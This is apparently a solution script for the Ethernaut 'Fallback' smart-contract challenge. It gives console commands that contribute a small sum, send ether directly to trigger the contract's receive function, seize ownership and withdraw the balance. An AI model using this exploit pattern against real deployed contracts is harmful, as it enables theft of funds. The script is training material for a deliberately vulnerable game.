/*
    Not a big deal, just you need to contribute some ether, and then send some ether by taking
    the advantage of `receive` function in the smart contract
*/

// Contribute a amount less than 0.001 ether after converting your ether value to wei using `toWei()` function of ethernaut
toWei("0.0001") // it gives us -> "100000000000000" 

await contract.contribute({value: 100000000000000})

// Now just send some ether into the contract without using contribute function
await contract.sendTransaction({value: 1})

// check for the owner, ofcourse now you got the damn ownership
await contract.owner()

// Now withdraw and then submit
await contract.withdraw()